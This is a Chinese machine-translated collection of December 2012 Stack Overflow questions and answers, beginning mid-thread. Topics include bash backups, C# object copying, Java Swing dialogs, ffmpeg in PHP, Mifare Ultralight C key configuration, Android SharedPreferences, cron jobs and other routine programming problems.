find /backups/www -type f -mtime -1|xargs tar uf /daily/backup-$today.tar 
```

如您所见，它会创建过去 24 小时内修改/创建的文件的备份。但是，如果没有找到文件，它会创建损坏的 tar 文件。我想将它包装在 if..fi 语句中，这样 id 就不会创建空/损坏的 tar 文件。

有人可以帮我修改这个脚本吗？

谢谢

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-12T14:29:19.310

您可以检查结果是否正常，然后检查结果是否为空：

```
 today=$(date +"%Y-%m-%d")
   results=`find /backups/www -type f -mtime -1`

    if [[ 0 == $? ]] ; then
     if [[ -z $results ]] ; then
      echo "No files found"
     else
      tar uf /daily/backup-$today.tar $results
     fi
    else
     echo "Search failed"
    fi 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-12T14:04:45.197

```
find /backups/www -type f -mtime -1 -exec tar uf /daily/backup-$today.tar {} + 
```

使用`-exec`优于`xargs`. 不需要管道，它可以处理带有空格、换行符和其他不寻常字符的文件名，而无需额外的工作。最后`{}`的 是文件名的占位符，并`+`标记`-exec`命令的结束（以防 有更多参数`find`）。

作为奖励，如果没有找到文件，它将不会执行该命令。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T15:57:33.373

一个相对简单的技巧是：

```
today=$(date +"%Y-%m-%d")
touch /backups/www/.timestamp
find /backups/www -type f -mtime -1|xargs tar uf /daily/backup-$today.tar 
```

这样，您就可以保证始终找到至少一个文件（并且它的大小最小）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-12T17:28:32.033

`xargs -r`如果没有输入，则什么也不做。

# c# - C# 创建同一个类的另一个实例 - 反射？

> ID：13841454
> 
> 赞同：1
> 
> 时间：2012-12-12T14:01:02.700
> 
> 标签：c#, reflection

我正在制作一个游戏，其中涉及将对象放置在房间中。房间存储可以放置在其中的对象列表，例如

```
List<RoomObject> possibleObjects = new List<RoomObject>(){ new Bed(), new Table() }; 
```

然后将这些对象分别发送到允许用户单击按钮的按钮，进入所选对象的放置阶段，然后用户在房间中单击，然后放置对象。

例如

```
public Room currentRoom;
public RoomObject currentObject;
//...
public void onClick()
{
    if (CanPlace) currentRoom.Add(currentObject);
} 
```

我的问题是，如果用户想要放置多个相同的对象，它的当前设置方式将意味着完全相同的对象将被添加到房间，并且如果该对象稍后以某种方式进行编辑（例如床.occupied = true)，它将影响房间中该类型的所有对象。

有没有一种方法可以复制一个对象（以获得单独的引用），而我不必使用反射（我不是很熟悉，感觉是不安全的代码）。

我假设反射方式将传递一个类型，然后必须使用 Type.GetConstructor 调用构造函数，但如果可能的话，我宁愿不这样做。如果反射是唯一的方法，有人可以提供如何做到这一点的示例代码吗？

编辑 - 也许我需要指定我的变量 currentObject 不会保存类型 RoomObject 的变量，而是一个子类，例如 Bed。（床继承自 RoomObject）。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-12T14:03:31.307

您应该为您的对象定义一个复制构造函数。这将允许您基于该类的另一个实例的值来实例化一个类。这是一个教程：

[http://msdn.microsoft.com/en-us/library/ms173116(v=vs.80).aspx](http://msdn.microsoft.com/en-us/library/ms173116(v=vs.80).aspx)

```
public class RoomObject
{
    public RoomObject(RoomObject roomObject)
    {
    //Copy room object properties
    }
}

public class Bed : RoomObject
{
    public Bed(Bed bed) : base(bed)
    {
    //Copy Bed properties
    }
} 
```

用法

```
Bed bedOne = new Bed();  

Bed bedTwo = new Bed(bedOne);  //Create a bed using Bed copy constructor

RoomObject roomObject = new RoomObject(bedOne)  //Creates a room object using RoomObject copy constructor 
```

进一步编辑

```
public abstract class RoomObject<T> where T : new()
{
    protected T CreateRoomObjectCopy(T roomObject)
    {
        T concreteType = new T();
        //Copy Room object properties
        return concreteType;
    }

    public abstract T Copy(T roomObject);
}

public class Bed : RoomObject<Bed>
{
    public override Bed Copy(Bed roomObject)
    {
        Bed newBed = CreateRoomObjectCopy(roomObject);
        //Copy bed properties
        return newBed;
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-12T14:07:19.703

使用复制构造函数或反射。

通过反射，它并不像您想象的那么复杂，只需将[Activator](http://msdn.microsoft.com/en-us/library/system.activator.aspx)类与 Type 一起使用，您就可以获得该 Type 的实例。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T14:07:51.853

反射没有什么不安全的。它是 .NET 等托管语言的优点之一。

我可能错了，但听起来你想克隆一个对象实例（而不是对同一个实例有两个引用）。

看看下面的链接。

[深度克隆对象](https://stackoverflow.com/questions/78536/deep-cloning-objects-in-c-sharp)

[如何克隆对象](https://stackoverflow.com/questions/5359318/how-to-clone-objects)

**额外的：**

您可以尝试实现 ICloneable，从而提供您自己的机制来克隆对象

**示例：**

```
public class RoomObject : ICloneable
{
    public object Clone()
    {
        return new RoomObject { X = this.X, Y = this.Y, Z = this.Z };
    }
}

RoomObject ro = new RoomObject();

RoomObject ro2 = (RoomObject)ro.Clone(); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-12-19T10:04:05.950

```
class Program
{
    static void Main(string[] args)
    {
        Bed bed = RoomObject.RoomName("Bed");
        Console.WriteLine(bed.name);
       //outline:Bed
        Console.Read();
    }
}
public class RoomObject
{
    public static Bed RoomName(string BedName)
    {
        Bed newBed = new Bed();
        newBed.name = BedName;
        return newBed;
    }
}
public class Bed
{
    public string name { get; set; }
} 
```

# c - scanf 的默认值

> ID：13841455
> 
> 赞同：1
> 
> 时间：2012-12-12T14:01:04.563
> 
> 标签：c, scanf

我想做这样的事情：

```
char name[20];
printf("Enter your name: ");
scanf("Micheal%s", &name); 
```

我想`Michael`在控制台上进行编辑，如果用户在`Enter`没有编辑任何内容的情况下按下，则 name 设置为`Micheal`. 有什么简单的方法可以做到这一点吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-12T14:03:11.750

不，没有。

“控制台”和“鼠标”不是 C 指定存在的东西。

您需要查看库，例如用于执行此类操作的[ncurses](http://www.gnu.org/software/ncurses/)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T16:30:58.550

不可编辑，但可能还不错：

```
char name[20] = "Michael";

printf("Enter your name [default: %s]: ", name);
fflush (stdout); /* Makes the printf output appear even without a newline. */
scanf("%s", &name); 
```

所有关于扫描`%s`到一个小缓冲区而不测试 scanf 的返回值的警告都适用。

# java - 有效地从各种不同的 JFrame 收集数据

> ID：13841458
> 
> 赞同：0
> 
> 时间：2012-12-12T14:01:14.073
> 
> 标签：java

考虑以下场景：

我有一个 JFrame“ **Main** ”，它有一个 jButton“ **caravanDataButton** ”，它打开另一个 JFrame“ **CaravanData** ”。

**CaravanData**有几个 JTextField。其目的是询问用户问题，并在用户完成后将答案传回**Main**。

我的问题：**将数据从子 JFrame 传输到调用父 JFrame 的最有效方法是什么（或者从这个示例从 CaravanData 返回到 Main）**

理想情况下，我想做以下事情：

```
class Main
{
    public Main
    {
        CustomVariable data = new CaravanData();
    }
} 
```

但是，构造函数没有返回类型。**但这将是最好的方法，因为在CaravanData**类完成其业务之前，不会为变量“data”赋值。

我的替代解决方案是使用 getter 和 setter。但是我必须等到用户填写完表格后才能检索数据。我使用了一个while循环：

```
class Main
{
    public Main
    {
        CaravanData caravanData = new CaravanData();
        while (caravanData.isUserFinished == false) 
        {//...Do nothing}

        // Once the user has finished - collect the data:
        CustomVariable data = caravanData.getRelevantData();
    }
}

class CaravanData
{
    ...
    public boolean isUserFinished() 
    {return ifUserHasCompletedForm;}

    public CustomerVariable getRelevantData()
    {
        ...
        return data;
    }
} 
```

我认为这种方法根本没有效率。有没有更好的技术？我有一些 JFrame，因为有很多问题要问。我不知道如何用这个词在网上找到答案。我确实想过使用线程？停止一个进程，直到另一个进程完成。但是我的印象是，您只在任务从 EDT 消耗大量时间时才使用线程？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T14:33:21.960

尝试使用 JDialog 作为您的子窗口。`setVisible(true)`JDialog的方法阻塞直到对话框被释放（通常通过`setVisible(false)`从对话框内部调用）

之后，您可以通过您的`getRelevantData()`方法加载所有数据。

```
 class Main
 {
     public Main
     {
         CaravanData caravanData = new CaravanData();
         // Show the dialog - setVisible(true) blocks till ok is pressed
         caravanData.setVisible(true);

         // Once the user has finished - collect the data:
         CustomVariable data = caravanData.getRelevantData();
     }
 }

class CaravanData extends JDialog
{
    ...
    // Called by an ActionListener for the OK Button
    private void okButtonPressed(){
         setVisible(false);
    }

    public CustomerVariable getRelevantData()
    {
       ...
       return data;
    }
} 
```

# css - CSS定位品牌问题

> ID：13841459
> 
> 赞同：-1
> 
> 时间：2012-12-12T14:01:14.973
> 
> 标签：css, twitter-bootstrap

我正在尝试实现此处的品牌外观（品牌与导航栏重叠） - [http://logobro.com/our-work](http://logobro.com/our-work)

但是我似乎错过了帮助我实现这一目标的 CSS 规则，正如您在此处的网站中看到的那样：[http ://www.bestcastleintown.co.uk/port/](http://www.bestcastleintown.co.uk/port/)

这是我目前的样式`.brand`

```
.navbar .brand {
    color: #FFFFFF;
    display: block;
    float: left;
    font-size: 20px;
    font-weight: 200;
    line-height: 1;
    margin-left: -20px;
    padding: 8px 20px 12px;
} 
```

任何建议表示赞赏。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T14:05:20.683

这只是您的边距和填充的问题，而不是`padding: 8px 20px 12px;`尝试：

```
padding: 12px 20px 0px;
margin-bottom: -4px; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T14:11:01.803

使用这个 CSS：

```
#topbar-logo
{
  margin-bottom: -3px;
}

.brand
{
  padding: 0px;
} 
```

这将获得与您的示例网站完全相同的效果。

# php - ffmpeg 和 ffmpeg-php

> ID：13841462
> 
> 赞同：2
> 
> 时间：2012-12-12T14:01:20.960
> 
> 标签：php, video, ffmpeg

我需要从视频上传中压缩、转换和生成缩略图。

实时服务器是 Linux，但为了开发，我们使用的是 Windows 7 PC，两者都使用 PHP 5.4。

似乎 ffmpeg 与 ffmpeg-php 不同，ffmpeg-php 只能生成缩略图。

有没有办法在 windows 和/或 linux 上使用 ffmpeg 作为 php 扩展？

是否有与 php 5.4 兼容的 ffmpeg-php 编译 dll？

出于上述要求的目的，是否有 ffmpeg 的 php 替代方案可以在**Linux**和 Windows 上运行？

谢谢

作为一个

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T16:02:22.207

PHP-FFmpeg 或 php_ffmpeg.dll 仅适用于生成缩略图和查询视频文件的属性。有关PHP 5.4 的 php_ffmpeg.dll 中的函数，请参见[http://x32.elijst.nl/fftest.php54 。](http://x32.elijst.nl/fftest.php54)API参考： http: [//ffmpeg-php.sourceforge.net/doc/api/](http://ffmpeg-php.sourceforge.net/doc/api/)

对于网络服务器上的视频压缩，您必须使用 exec 或 popen 对 ffmpeg 进行系统调用。关于这方面的一些话可以在这里找到：http: [//ffmpeg.org/trac/ffmpeg/wiki/Using%20FFmpeg%20from%20PHP%20scripts](http://ffmpeg.org/trac/ffmpeg/wiki/Using%20FFmpeg%20from%20PHP%20scripts)

后期编辑：我为各种 Windows PHP 风格构建 php_ffmpeg.dll。在 Apachelounge 上查看这个论坛：http: [//www.apachelounge.com/viewforum.php? f=6](http://www.apachelounge.com/viewforum.php?f=6)

另一个后期编辑：现在有第二个使用 FFMpeg 的 PHP 扩展： [https](https://github.com/chung-leong/av/wiki) ://github.com/chung-leong/av/wiki由[http://www.php-qb.net/](http://www.php-qb.net/)的制造商提供 我添加了 php_av .dll 到我的构建。请参阅 Apachelounge 论坛：[http ://www.apachelounge.com/viewtopic.php?p=27023#27023](http://www.apachelounge.com/viewtopic.php?p=27023#27023)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-07-17T12:42:21.290

这将更好地工作。

shell_exec('ffmpeg -i C:\xampp\htdocs\videoCutting\movie.mp4 -ss 00:00:00 -t 00:00:05 -async 1 C:\xampp\htdocs\videoCutting\SampleVideoNew.mp4')

# ios - CAReplicatorLayer 背后的魔力是什么？

> ID：13841463
> 
> 赞同：18
> 
> 时间：2012-12-12T14:01:21.070
> 
> 标签：ios, core-animation, calayer, quartz-core, careplicatorlayer

我发现 CAReplicatorLayer 的有趣之处：

*   它能够非常有效地使用不同的转换多次显示 CALayer（如何？）
*   似乎它以某种方式重用了复制层的“后备存储”，甚至对其应用了一些颜色（如何？）

我想获得源代码或了解 CAReplicatorLayer 背后的魔力。我想要一个类似于 CAReplicatorLayer 的 CALayer 类，但有更多的控制权。我想**为每个复制实例**单独**控制转换**。

 **所以以完全不同的方式问：是否有可能获得 CALayer 的“后备存储”并显示它，但是我想要多少次？

（“后备存储”是指 CALayer/UIView 的渲染纹理。我对 CoreAnimation/QuartzCore 的幕后发生的事情知之甚少）。

* * *

为什么我不考虑诸如将 CALayer 渲染到 UIImage 之类的替代方法：

*   表现
*   内容是动态的/在过渡下经常变化
*   以另一种方式做到这一点将是非常棒的！

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-12-13T06:12:03.530

CAReplicatorLayer 或 CAGradientLayer 等特殊用途的 CALayer 能够（通过私有 API）使用快速填充或复制直接在 GPU 上执行绘图。从某种意义上说，它们是不同的，因此后备存储不在普通 RAM 中，而是直接在 GPU 上。**

# tablesorter - 带有 AJAX 的 JQuery 表排序器寻呼机 - 排序无法正常工作

> ID：13841465
> 
> 赞同：1
> 
> 时间：2012-12-12T14:01:23.840
> 
> 标签：tablesorter

我对 JQuery 表排序器寻呼机插件有疑问。我正在尝试通过 AJAX 调用使用分页。在大多数情况下，它似乎工作正常，但我无法让排序工作。

问题是，当发出请求时，它总是看起来像（假设[这里](http://mottie.github.com/tablesorter/docs/example-pager-ajax.html)的示例代码）：

```
http:/mydatabase.com?page=0&size=100&{sortList:col} 
```

就像最后一个参数`{sortList:col}`实际上从未被正确的排序列替换一样。

如果我正确阅读了示例，则请求`sortList = [[2,0],[3,0]]`实际上应该如下所示：

```
http:/mydatabase.com?page=0&size=100&col[2]=0&col[3]=0 
```

但在我的情况下，它从来都不是。此外，当我单击标题时，会执行排序，但没有发出请求。

链接的示例中有什么我遗漏的吗？

**编辑**

通过用最新版本替换插件解决了我的问题的第一部分。

对于第二部分，单击（排序）列时我仍然无法收到请求。[ajaxProcessing 函数与此处](http://mottie.github.com/tablesorter/docs/example-pager-ajax.html)的示例几乎完全相同，只是重命名了 headers 变量。

正如 Mottie 所建议的，我正在发布 AJAX 调用（MS MVC JsonResult）的示例结果：

```
{
"total_rows":1,
"headers":["Id.","Date","User name","File name","status","Hash","Link"],
"rows":[
    {
        "Id":"21",
        "ReceiveDate":"02.12.2012",
        "UserName":"John Doe",
        "FileName":"test.txt",
        "Status":"",
        "Hash":"4A71FD2E12F7E04ED0C04E17476BD1BC5F823C8F",
        "FileNameLink":"\u003ca style=\"padding-left:10px\" href=\"GetFile?Id=21&fileName=test.txt\"\u003eSave\u003c/a\u003e"
    }]
} 
```

问候

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-23T05:53:08.223

抱歉，我没有机会彻底测试寻呼机的最新更改。有些代码是由其他人编写的，所以我可能遗漏了一些明显的东西。

无论如何，这可能是导致您出现问题的错误。它在每次排序后将表格重置为第一页...我将在下一次更新中修复。

在寻呼机插件中，第 460-470 行是以下代码：

```
.bind('filterEnd.pager sortEnd.pager', function() {
    //Prevent infinite event loops from occuring by setting this in all moveToPage calls and catching it here.
    if ($.data(table, 'pagerUpdateTriggered')) {
        $.data(table, 'pagerUpdateTriggered', false);
        return;
    }
    c.page = 0;
    updatePageDisplay(table, c);
    moveToPage(table, c);
    changeHeight(table, c);
}) 
```

只需将其更改`c.page = 0`为：

```
if (e.type === 'filterEnd') { c.page = 0; } 
```

并`e`在`function(e)`.

# iphone - 使用 Facebook Connect 和 iPhone 保持登录状态

> ID：13841470
> 
> 赞同：1
> 
> 时间：2012-12-12T14:01:43.973
> 
> 标签：iphone, facebook, ruby-on-rails-3, omniauth

我使用 Facebook Connect（和 OmniAuth gem）对我的 Rails 网站上的用户进行身份验证。在我的桌面上 - 用户可以跨浏览器会话保持登录状态。但是从我的 iPhone 中访问同一个站点——我可以通过 FB Connect 登录——但是当我的浏览器会话结束时——我的登录用户也是如此。在 iPhone 上尤其烦人，因为完成整个连接过程确实需要一段时间。

我认为这与无法在浏览器会话中幸存的 cookie 有关。我可以做些什么来让我的用户在使用他们的 iPhone 浏览器时保持登录状态？

# key - Mifare Ultralight C 3DES 密钥更改

> ID：13841472
> 
> 赞同：2
> 
> 时间：2012-12-12T14:01:47.247
> 
> 标签：key, nfc, 3des, mifare

我正在尝试更改 Ultralight C 卡上的 3DES 密钥。我可以将值写入地址 44-47，正如我在此处的某些主题中找到的那样。但是我在使用它时无法进行身份验证。如果我写回默认密钥，它可以正常工作。

我认为有些东西我不明白，这可能是问题的根源，查看免费库示例以及来自这个和 libnfc 论坛的一些帖子，我发现超轻 C 中的默认键是： `425245414b4d454946594f5543414e21` *（ASCII 的十六进制值“ BREAKMEIFYOUCAN!")*，但要在客户端解密它使用的密钥`49454D4B41455242214E4143554F5946`。

我不知道这两个键之间的关系是什么，但我认为需要进行一些预先确定的操作才能从另一个生成一个，这就是我失败的原因。有人有幸这样做吗？感谢每一个帮助

对于我的所有代码，我都使用[此代码作为起点](http://code.google.com/p/nfc-tools/source/browse/trunk/libfreefare/examples/mifare-ultralight-info.c)。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2018-05-30T15:14:24.063

你设法解决了你的问题吗？你介意与社区分享你的代码吗？

如果你没有，这里是前提：

如果十六进制键是：“00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F”，那么您必须在4 页，从页 0x2C (44) 到页 0x2F (47)。

如果您想更改需要身份验证的位置（哪些页面），请执行以下操作：

*   0x2A 定义需要验证的页面地址。例如，如果 0x2A = 0x30，则不需要身份验证，因为内存上升到 0x2F。
*   0x2B 定义读/写 (0x2B=0) 或仅写访问 (0x2B=1) 是否需要身份验证

# javascript - Pagemethods 的成功函数 - 返回值始终为 null

> ID：13841475
> 
> 赞同：-1
> 
> 时间：2012-12-12T14:01:51.703
> 
> 标签：javascript, asp.net, vb.net, pagemethods

在我的 asp.net 应用程序中，我有一个按钮，单击该按钮会调用 javascript 函数。这个函数使用pagemethods在后面的VB代码中调用一个服务器端函数。这可以正常工作，并且在函数结束时我返回一个字符串。当成功函数在客户端命中时 - 返回值始终为空。有人看到这个问题吗？下面列出了一些代码，看看它是如何工作的。谢谢你。

按钮

```
<asp:button id="btnSaveSoln" onclientclick="refreshParentTree()" runat="server" Text="Save" Cssclass="smalltextbutton"></asp:button> 
```

refreshParentTree Javascript

```
function refreshParentTree() {

var chkUpdate = document.getElementById('chkUpdatePlanner');
var chkValue;
if (chkUpdate != null) {
    if (document.getElementById('chkUpdatePlanner').checked = true) {
              chkValue = 1;
    }
    else {
              chkValue = 0;
    }
}
else {
    chkValue = 0;
}

var txtClient = document.getElementById('txtClientID');
var txtClientValue;
if (txtClient != null) {
    txtClientValue = document.getElementById('txtClientID').value;
}
else {
    txtClientValue = '';
}

PageMethods.save(document.getElementById('hdnProjectCreator').value,     document.getElementById('txtTitle').value, document.getElementById('txtDescription').value, document.getElementById('hdnProjectManager').value, document.getElementById('txtSchedStart').value, document.getElementById('hdnApprover').value, document.getElementById('dropdownProjectType').value, document.getElementById('drpdownProjectPriority').value, txtClientValue, 0, document.getElementById('DropDownPhaseList').value, chkValue, document.getElementById('DropDownWorkWeekLengthList').value, document.getElementById('hdnTemplateID').value, saveSuccess, saveFailure);
} 
```

服务器端的保存功能（VB）

```
 <System.Web.Services.WebMethod()> _
    Public Shared Function save(ByVal hdnProjCreator As String, ByVal titleTxt As String, ByVal desc As String, ByVal hdnProjManager As String, ByVal SchedStart As String, ByVal ApproverTxt As String, ByVal ddProjectType As String, ByVal ddProjectPriority As String, ByVal ClientIDtxt As String, ByVal ddEquipmentList As String, ByVal ddPhaseList As String, ByVal UpdatePlanner As String, ByVal ddWorkWeekLengthList As String, ByVal TemplateID As String)
    ***** SQL Computing here, removed for stack overflow - ddWorkWeekVisable, lnResult, parentID and taskgrpPCat are all strings *****  

        Dim returnString As String = ddWorkWeekVisable & ":" & lnResult & ":10:" & parentID & ":" & taskgrpPCat
        Return returnString

    End Function 
```

从这里开始，当成功函数命中时，我使用警报查看返回字符串的值，我总是得到 null - 成功 JS 函数

```
function saveSuccess(response) {
alert('save success hit - response: ' + response)
} 
```

另外，我在服务器端导入以下内容

```
Imports System.Data.SqlClient
Imports System.Web.Configuration
Imports System.Web.Services
Imports System.Web.Services.WebMethodAttribute
Imports System.Web.SessionState.SessionStateMode
Imports System.Web.UI.WebControls
Imports System.Web
Imports System.Data 
```

我还在客户端包含了以下脚本管理器

```
 <asp:ScriptManager ID="ScriptManager1" runat="server"   
      EnablePageMethods="True">
</asp:ScriptManager> 
```

感谢您的帮助。我过去经常使用页面方法，但我似乎无法弄清楚为什么在这种情况下我总是重新输入 null。再次感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T15:01:12.500

问题已解决，问题出在服务器端函数中，无法使用 httpcontext.current.response.write - 这导致返回失败

# android - SharedPreferences 仅返回默认值

> ID：13841488
> 
> 赞同：4
> 
> 时间：2012-12-12T14:02:22.740
> 
> 标签：android, android-intent, sharedpreferences

因此，我没有创建数据库，而是使用`SharedPreference`.

我的代码如下：

```
 SharedPreferences.Editor editor = getPreferences(MODE_PRIVATE).edit();
        editor.putInt("favid"+id, 1);
        editor.commit();
        Toast.makeText(getApplicationContext(), "Select as favorite", Toast.LENGTH_SHORT).show(); 
```

现在我想检索该数据，因此我在**其他活动**中使用了以下代码：

```
 strFav = new ArrayList<Integer>();

    if(strFav.size()>0)
        strFav.clear();
    SharedPreferences prefs = getPreferences(MODE_PRIVATE); 
    for (int i = 1; i < 19; i++) {
        int favid = prefs.getInt("favid"+i, -1);
        if (favid != -1) 
        {
          strFav.add(i);
        }
    } 
```

在数据检索时，我得到的所有值都是`-1`.

任何机构都可以帮助我为什么会发生这种情况？我已经提交了许多条目作为 1，但我仍然得到`-1`了所有条目的结果。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-12T14:20:13.280

请参阅有关方法的[文档](http://developer.android.com/reference/android/app/Activity.html#getPreferences%28int%29)`getPrefernces`：

> 检索一个 SharedPreferences 对象以访问**此活动专用的**首选项。

因此，如果您想在活动之间共享偏好，您应该使用[`getSharedPreferences`](http://developer.android.com/reference/android/content/ContextWrapper.html#getSharedPreferences%28java.lang.String,%20int%29)指定的名称。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T14:16:09.903

**您是否在一个**应用程序的两个不同活动中使用共享偏好？

还尝试指定首选项名称，或使用一些管理器来处理所有首选项，所有这些都[在这里解释](https://stackoverflow.com/questions/5734721/android-shared-preferences)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T14:03:27.647

```
editor.putInt("favid"+id, 1); 
```

id 等于 0 是怎么回事？在这里你从 1 开始阅读

```
 for (int i = 1; i < 19; i++) { 
```

# performance - Memcached 慢查询

> ID：13841493
> 
> 赞同：1
> 
> 时间：2012-12-12T14:03:06.727
> 
> 标签：performance, memcached

我实际上预计 memcached 上的某些请求的响应时间会很慢。我正在运行 nodeJS 服务器，客户端是 node-memcached。从日志文件中，我提取了如下所示的响应时间分布：

```
Count   Response time (ms)

6204    00001
4627    00002
1465    00003
 414    00004
 141    00005
  69    00006
  23    00007
  17    00008
  11    00009
   2    00010
   2    00011
   2    00012
   1    00015
   1    00016
   1    00020
   1    00023
   1    00024
   1    00026
   1    00076
   1    00212
   1    00213
   1    00214
   1    00215
   1    00217
   1    00219
   1    00220
   1    03004
   1    03010 
```

真正奇怪的是那些异常请求，它们消耗大约 215 和 3000 毫秒。存储的对象基本相同，memcached版本是1.4.5。以下是来自 (8) 台服务器之一的统计数据：

```
STAT pid 2359
STAT uptime 12131402
STAT time 1355303458
STAT version 1.4.5
STAT pointer_size 64
STAT rusage_user 161954.749539
STAT rusage_system 423668.017596
STAT curr_connections 930
STAT total_connections 12097997
STAT connection_structures 1254
STAT cmd_get 46838365743
STAT cmd_set 1560759291
STAT cmd_flush 0
STAT get_hits 40796019120
STAT get_misses 6042346623
STAT delete_misses 237357218
STAT delete_hits 49942676
STAT incr_misses 0
STAT incr_hits 0
STAT decr_misses 0
STAT decr_hits 0
STAT cas_misses 0
STAT cas_hits 0
STAT cas_badval 0
STAT auth_cmds 0
STAT auth_errors 0
STAT bytes_read 4178933811835
STAT bytes_written 64248216431317
STAT limit_maxbytes 24062722048
STAT accepting_conns 1
STAT listen_disabled_num 0
STAT threads 8
STAT conn_yields 3956
STAT bytes 21362090264
STAT curr_items 14583102
STAT total_items 1560759290
STAT evictions 712640376
STAT reclaimed 131709403 
```

# cakephp-2.0 - cakePHP 脚本，将所有功能

> ID：13841494
> 
> 赞同：1
> 
> 时间：2012-12-12T14:03:09.793
> 
> 标签：cakephp-2.0

嗨..我需要一个 cakePHP 脚本的帮助，该脚本将在指定的时间间隔后刷新或调用控制器中的函数。

```
public function testwebservices(){
    ini_set("soap.wsdl_cache_enabled","0");  
    $options = array( 
    'soap_version'=>SOAP_1_2,           
    'exceptions'=>true,                 
    'trace'=>1,                     
    'cache_wsdl'=>WSDL_CACHE_NONE       
);
$wsdl = "http://example.com/service.asmx?wsdl";
$client = new SoapClient($wsdl,$options);
$lastrec = rec5000;         
$rec = $client->GetReceipt(array('txnRef'=>$lastrec));
$result = $rec->GetReceiptRez; 
```

我想调用上述函数，使其在指定时间后自动执行。

先感谢您

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T14:15:57.327

最好的办法是使用 cron 任务（如果你在 Unix/Linux 机器上）。cron 任务可以用几种方式编写。

**第一：** 你可以直接用 PHP 解释器调用你的脚本，你在 cron 中运行的脚本可能看起来像

```
#!/bin/sh
/path/to/php /full/path/to/script.php 
```

但是，您需要注意，您不会获得框架的好处。这意味着您使用的任何框架实用程序都必须将自己加载到`script.php`文件中。如果这太多（加载所有必需的实用程序），那么你可以用另一种方式来做。

**第二：**您可以创建一个端点，例如`/test/web-service`，您可以设置一个 cron 来向该脚本发出 Web 请求，该脚本将检查 Web 服务是否正常运行。在这种情况下，您将有一个简单的 cURL 请求，可能如下所示：

```
#!/bin/sh
curl http://mysite.com/test/web-service 
```

这种方法的好处是您可以真正将它放在任何机器上（如果您公开 URL），并且您可以加载您的框架（在本例中为 cakePHP）并且所有实用程序都可供您使用。

# c++ - 错误的文件描述符管道 Win32 API

> ID：13841508
> 
> 赞同：1
> 
> 时间：2012-12-12T14:03:41.577
> 
> 标签：c++, winapi, pipe

下面的代码总是给我一个错误，比如`read file child: Bad file descriptor`or `read file child: No error`。

父创建子进程，从匿名父管道读取数据。`HANDLE`从 std获取时发生错误。

父级.cpp：

```
sinfo.hStdInput = pipe_read;
/****some code********/
if(!CreateProcess(0, szCmdline, 0, 0, 0, 0, 0, 0, &sinfo, &pinfo))
{
    perror("create process");
    exit(1);
}
/****some code********/

if(!WriteFile(pipe_write, &to_process, sizeof(int)*20, &bytes, 0))
{
    perror("write file parent");
    exit(1);
}

vector<int> sorted;
if(!ReadFile(pipe_read1, &sorted, sizeof(int)*20, 0, 0))
{
    perror("read file parent");
    exit(1);
} 
```

孩子.cpp：

```
/****some code********/

HANDLE pipe_read = GetStdHandle(STD_INPUT_HANDLE);

/****some code********/

if(!ReadFile(pipe_read, &to_process, sizeof(int)*20, &bytes, 0))
{
    perror("read file child");
    exit(1);
}
/****some code********/ 
```

我的代码有什么问题？接收（子）和转发（父）的地址是相等的。

# java - 将 HTML 5 数据属性传递给 Play！表单输入

> ID：13841509
> 
> 赞同：7
> 
> 时间：2012-12-12T14:03:44.857
> 
> 标签：java, forms, playframework, playframework-2.0

我正在使用 Java + Play 2.0.4，我需要将一些“数据-”属性传递给我的输入字段，例如：

```
@inputDate(
  myform("start"),
  '_showConstraints -> false,
  '_label -> Messages("label.start.date"),
  'data-date-format -> "mm/dd/yyyy"
) 
```

这会引发“值 - 不是 Symbol 的成员”错误。

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-12-12T15:32:00.467

我不记得我在哪里看到的，但它有效：

```
Symbol("data-date-format") -> "mm/dd/yyyy" 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T14:58:48.053

检查[文档](http://www.playframework.org/documentation/2.0.4/JavaFormHelpers)以创建自己的助手

你可以使用ie。“自己处理 HTML 输入创建”部分中描述的方式，如果您打算在许多地方使用它，您还可以“编写自己的字段构造函数”。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-06-26T12:12:12.343

好吧，因为@Ubersoldat 说“它适用于所有不包含破折号的东西。” -> 也许这需要在框架中修复以使事情变得更容易？

# codeigniter - 多语言文章的杂货 CRUD

> ID：13841518
> 
> 赞同：3
> 
> 时间：2012-12-12T14:04:20.807
> 
> 标签：codeigniter, grocery-crud

我按照 Grocery CRUD web 文档中的指南进行操作，但我找不到该库是否支持多语言应用程序的操作。假设我有一个表格文章，其中有一列“lang”，

**id**   **lang**      **title**
1 EN 标题为 en
1 DE 标题为 de

如何使用或修改视图以进行编辑、放置选项卡或下拉菜单。我可以用杂货店做这个吗？如果您是另一个图书馆，请与我们分享。

提前致谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-05T14:38:34.797

一个典型的 Grocery CRUD DB 表可以显示为类似于：

```
 $crud = new grocery_CRUD();

        $crud->set_table('Products');
        $crud->set_subject('Product');

        $crud->columns('id', 'Name', 'Price')
            ->display_as('Name','Product Description');

        $output = $crud->render(); 
```

